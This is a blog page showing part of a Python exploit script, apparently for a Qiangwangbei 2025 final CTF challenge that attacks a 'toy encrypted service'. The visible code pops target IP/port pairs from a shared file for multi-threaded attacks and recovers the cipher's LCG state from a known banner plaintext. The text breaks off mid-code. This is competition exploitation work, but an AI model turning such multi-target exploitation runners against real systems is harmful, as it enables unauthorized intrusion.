<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>花盆 | /writeups/Qwb-2025-final-Writeup/all_exp.py</title><meta name="author" content="LittFlower"/><meta property="og:title" content="花盆 | /writeups/Qwb-2025-final-Writeup/all_exp.py"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/Qwb-2025-final-Writeup/all_exp.py"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><span style="color:#1E754F">from</span><span style="color:#998418"> __future__</span><span style="color:#1E754F"> import</span><span style="color:#393A34"> annotations</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> concurrent</span><span style="color:#999999">.</span><span style="color:#393A34">futures </span><span style="color:#1E754F">import</span><span style="color:#393A34"> ThreadPoolExecutor</span><span style="color:#999999">,</span><span style="color:#393A34"> as_completed</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> threading </span><span style="color:#1E754F">import</span><span style="color:#393A34"> Lock</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> binascii</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> re</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> struct</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> string</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> sys</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> fcntl  </span><span style="color:#A0ADA0"># 用于文件锁，保证多线程/多进程安全</span><br><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">arch </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">amd64</span><span style="color:#B5695977">"</span><br><span style="color:#A0ADA0"># HOST = "39.101.70.58"</span><br><span style="color:#A0ADA0"># PORT = 16128</span><br><span style="color:#A65E2B">BINARY</span><span style="color:#999999"> =</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./somebox</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#A65E2B"> BINARY</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> load_ips</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    ip_list </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">    with</span><span style="color:#998418"> open</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> encoding</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">utf-8</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> f</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        for</span><span style="color:#393A34"> line </span><span style="color:#1E754F">in</span><span style="color:#393A34"> f</span><span style="color:#999999">:</span><br><span style="color:#393A34">            line </span><span style="color:#999999">=</span><span style="color:#393A34"> line</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> line</span><span style="color:#999999">:</span><br><span style="color:#1E754F">                continue</span><br><span style="color:#393A34">            parts </span><span style="color:#999999">=</span><span style="color:#393A34"> line</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">parts</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#393A34">                ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port </span><span style="color:#999999">=</span><span style="color:#393A34"> parts</span><br><span style="color:#1E754F">                try</span><span style="color:#999999">:</span><br><span style="color:#393A34">                    port_int </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">port</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                except</span><span style="color:#998418"> ValueError</span><span style="color:#999999">:</span><br><span style="color:#393A34">                    log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Skipping invalid port for </span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">port</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                    continue</span><br><span style="color:#393A34">                ip_list</span><span style="color:#999999">.</span><span style="color:#393A34">append</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port_int</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> ip_list</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pop_one_ip</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#999999">:</span><span style="color:#998418"> str</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#B5695977">    """</span><br><span style="color:#B56959">    从 filename（默认 csnote_ips.txt）中「取出一行 ip port」，并把这一行从文件中删除。</span><br><span style="color:#B56959">    返回 (ip, port_int) 或 None（表示没有更多目标）。</span><br><span style="color:#B56959">    带文件锁，适合多线程 / 多进程抢任务。</span><br><span style="color:#B5695977">    """</span><br><span style="color:#1E754F">    try</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        with</span><span style="color:#998418"> open</span><span style="color:#2993a3">(</span><span style="color:#393A34">filename</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">r+</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> encoding</span><span style="color:#999999">=</span><span style="color:#B5695977">"</span><span style="color:#B56959">utf-8</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> f</span><span style="color:#999999">:</span><br><span style="color:#A0ADA0">            # 独占锁，避免并发读写冲突</span><br><span style="color:#393A34">            fcntl</span><span style="color:#999999">.</span><span style="color:#393A34">flock</span><span style="color:#2993a3">(</span><span style="color:#393A34">f</span><span style="color:#999999">,</span><span style="color:#393A34"> fcntl</span><span style="color:#999999">.</span><span style="color:#A65E2B">LOCK_EX</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">            lines </span><span style="color:#999999">=</span><span style="color:#393A34"> f</span><span style="color:#999999">.</span><span style="color:#393A34">readlines</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">            # 找第一行非空行</span><br><span style="color:#393A34">            idx </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#1E754F">            while</span><span style="color:#393A34"> idx </span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">lines</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> and</span><span style="color:#AB5959"> not</span><span style="color:#393A34"> lines</span><span style="color:#2993a3">[</span><span style="color:#393A34">idx</span><span style="color:#2993a3">]</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                idx </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><br><span style="color:#1E754F">            if</span><span style="color:#393A34"> idx </span><span style="color:#AB5959">></span><span style="color:#AB5959">=</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">lines</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#A0ADA0">                # 没有目标了</span><br><span style="color:#393A34">                fcntl</span><span style="color:#999999">.</span><span style="color:#393A34">flock</span><span style="color:#2993a3">(</span><span style="color:#393A34">f</span><span style="color:#999999">,</span><span style="color:#393A34"> fcntl</span><span style="color:#999999">.</span><span style="color:#A65E2B">LOCK_UN</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">            first_line </span><span style="color:#999999">=</span><span style="color:#393A34"> lines</span><span style="color:#2993a3">[</span><span style="color:#393A34">idx</span><span style="color:#2993a3">]</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">            # 删除这一行，其他行保持原样</span><br><span style="color:#393A34">            new_lines </span><span style="color:#999999">=</span><span style="color:#393A34"> lines</span><span style="color:#2993a3">[</span><span style="color:#999999">:</span><span style="color:#393A34">idx</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> lines</span><span style="color:#2993a3">[</span><span style="color:#393A34">idx </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><span style="color:#999999">:</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">            f</span><span style="color:#999999">.</span><span style="color:#393A34">seek</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            f</span><span style="color:#999999">.</span><span style="color:#393A34">truncate</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            f</span><span style="color:#999999">.</span><span style="color:#393A34">writelines</span><span style="color:#2993a3">(</span><span style="color:#393A34">new_lines</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">            f</span><span style="color:#999999">.</span><span style="color:#393A34">flush</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">            fcntl</span><span style="color:#999999">.</span><span style="color:#393A34">flock</span><span style="color:#2993a3">(</span><span style="color:#393A34">f</span><span style="color:#999999">,</span><span style="color:#393A34"> fcntl</span><span style="color:#999999">.</span><span style="color:#A65E2B">LOCK_UN</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        parts </span><span style="color:#999999">=</span><span style="color:#393A34"> first_line</span><span style="color:#999999">.</span><span style="color:#393A34">split</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">parts</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Skipping invalid line in </span><span style="color:#1e754f">{</span><span style="color:#393A34">filename</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">first_line</span><span style="color:#AB5959">!r</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#393A34">        ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port_str </span><span style="color:#999999">=</span><span style="color:#393A34"> parts</span><br><span style="color:#1E754F">        try</span><span style="color:#999999">:</span><br><span style="color:#393A34">            port_int </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">port_str</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        except</span><span style="color:#998418"> ValueError</span><span style="color:#999999">:</span><br><span style="color:#393A34">            log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"Skipping invalid port for </span><span style="color:#1e754f">{</span><span style="color:#393A34">ip</span><span style="color:#1e754f">}</span><span style="color:#B56959">: </span><span style="color:#1e754f">{</span><span style="color:#393A34">port_str</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            return</span><span style="color:#1E754F"> None</span><br><br><span style="color:#1E754F">        return</span><span style="color:#393A34"> ip</span><span style="color:#999999">,</span><span style="color:#393A34"> port_int</span><br><br><span style="color:#1E754F">    except</span><span style="color:#998418"> FileNotFoundError</span><span style="color:#999999">:</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">warning</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"</span><span style="color:#1e754f">{</span><span style="color:#393A34">filename</span><span style="color:#1e754f">}</span><span style="color:#B56959"> not found."</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><span style="color:#1E754F">    except</span><span style="color:#998418"> Exception</span><span style="color:#1E754F"> as</span><span style="color:#393A34"> e</span><span style="color:#999999">:</span><br><span style="color:#393A34">        log</span><span style="color:#999999">.</span><span style="color:#393A34">failure</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"pop_one_ip() failed: </span><span style="color:#1e754f">{</span><span style="color:#393A34">e</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><br><br><span style="color:#A0ADA0"># Known plaintext banner (215 bytes, trailing space after "Your choice:")</span><br><span style="color:#A65E2B">BANNER_PT</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">================= TOY ENCRYPTED SERVICE =================</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1) Echo back what you send</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">2) Admin login</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">3) MagicCode runner</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">4) Show config</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">5) Quit</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">---------------------------------------------------------</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><br><span style="color:#AB5959">    b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Your choice: </span><span style="color:#B5695977">"</span><br><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><span style="color:#A0ADA0"># Bit helpers / LCG inversion</span><br><span style="color:#A0ADA0"># ---------------------------------------------------------------------------</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> ror64</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34"> n</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">x </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#393A34"> n</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> |</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">x </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A">64</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> n</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFF</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">y</span><span style="color:#999999">,</span><span style="color:#393A34"> k</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    x </span><span style="color:#999999">=</span><span style="color:#393A34"> y</span><br><span style="color:#393A34">    shift </span><span style="color:#999999">=</span><span style="color:#393A34"> k</span><br><span style="color:#1E754F">    while</span><span style="color:#393A34"> shift </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 64</span><span style="color:#999999">:</span><br><span style="color:#393A34">        x </span><span style="color:#999999">^=</span><span style="color:#393A34"> x </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#393A34"> shift</span><br><span style="color:#393A34">        shift </span><span style="color:#999999">*=</span><span style="color:#2F798A"> 2</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> x</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> invert_complex_transform</span><span style="color:#2993a3">(</span><span style="color:#393A34">v7</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    t </span><span style="color:#999999">=</span><span style="color:#393A34"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">v7</span><span style="color:#999999">,</span><span style="color:#2F798A"> 16</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    t </span><span style="color:#999999">=</span><span style="color:#393A34"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">t</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    t </span><span style="color:#999999">=</span><span style="color:#393A34"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">t</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    t </span><span style="color:#999999">=</span><span style="color:#393A34"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">t</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> inv_xorshift</span><span style="color:#2993a3">(</span><span style="color:#393A34">t</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> recover_state_from_block</span><span style="color:#2993a3">(</span><span style="color:#393A34">block_int</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    val </span><span style="color:#999999">=</span><span style="color:#393A34"> ror64</span><span style="color:#2993a3">(</span><span style="color:#393A34">block_int</span><span style="color:#999999">,</span><span style="color:#2F798A"> 7</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    high_v7 </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">val </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> &#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFF</span><br><span style="color:#393A34">    low_v7 </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">val </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFF</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ^</span><span style="color:#393A34"> high_v7</span><br><span style="color:#393A34">    v7 </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">high_v7 </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> |</span><span style="color:#393A34"> low_v7</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> invert_complex_transform</span><span style="color:#2993a3">(</span><span style="color:#393A34">v7</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> count_trailing_zeros</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> x </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#2F798A"> 64</span><br><span style="color:#1E754F">    return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">x </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> -</span><span style="color:#393A34">x</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">bit_length</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 1</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> modinv</span><span style="color:#2993a3">(</span><span style="color:#393A34">a</span><span style="color:#999999">,</span><span style="color:#393A34"> m</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> egcd</span><span style="color:#2993a3">(</span><span style="color:#393A34">x</span><span style="color:#999999">,</span><span style="color:#393A34"> y</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> x </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 0</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">y</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        g</span><span style="color:#999999">,</span><span style="color:#393A34"> p</span><span style="color:#999999">,</span><span style="color:#393A34"> q </span><span style="color:#999999">=</span><span style="color:#393A34"> egcd</span><span style="color:#2993a3">(</span><span style="color:#393A34">y </span><span style="color:#AB5959">%</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34"> x</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        return</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">g</span><span style="color:#999999">,</span><span style="color:#393A34"> q </span><span style="color:#AB5959">-</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">y </span><span style="color:#AB5959">//</span><span style="color:#393A34"> x</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> p</span><span style="color:#999999">,</span><span style="color:#393A34"> p</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    g</span><span style="color:#999999">,</span><span style="color:#393A34"> x</span><span style="color:#999999">,</span><span style="color:#393A34"> _ </span><span style="color:#999999">=</span><span style="color:#393A34"> egcd</span><span style="color:#2993a3">(</span><span style="color:#393A34">a</span><span style="color:#999999">,</span><span style="color:#393A34"> m</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> g </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 1</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        raise</span><span style="color:#998418"> ValueError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">no inverse</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> x </span><span style="color:#AB5959">%</span><span style="color:#393A34"> m</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> recover_ab_for_lane</span><span style="color:#2993a3">(</span><span style="color:#393A34">states</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">states</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 3</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        return</span><span style="color:#1E754F"> None</span><br><span style="color:#393A34">    pairs </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span 